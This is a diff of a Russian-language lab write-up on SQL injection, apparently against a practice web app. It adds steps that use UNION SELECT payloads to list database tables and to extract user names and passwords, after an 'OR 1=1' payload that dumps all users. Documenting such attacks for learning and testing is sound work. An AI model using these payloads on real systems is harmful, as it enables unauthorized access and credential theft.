@@ -58,7 +58,23 @@ $data->execute();
 В Burp Suite, можно увидеть перехваченные данные:
 ![image](https://user-images.githubusercontent.com/53438664/205754746-6ffa6a21-fe36-42ad-9f77-51b04c0fb191.png)
 
-
 Заменим `id=1` на `id=1 OR 1=1#` (с использованием URL-encode), в ответ получим всех пользователей:
 
 ![image](https://user-images.githubusercontent.com/53438664/205754589-c2213481-1d0f-4fd0-b60f-fbb32fe6871c.png)
+
+Произведём следующую инъекцию:
+```
+id=1 UNION SELECT NULL,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES#
+```
+В ответ получим названия таблиц:
+
+![image](https://user-images.githubusercontent.com/53438664/205755365-b612727e-18a2-404b-9bdb-3f3997e1a662.png)
+
+Произведём следующую инъекцию:
+```
+id=1 UNION SELECT USER,PASSWORD FROM users#
+```
+В ответ получим пароли пользователей:
+
+![image](https://user-images.githubusercontent.com/53438664/205756383-f86ea29b-c263-4c10-8d33-91e69c1a3bc1.png)
+
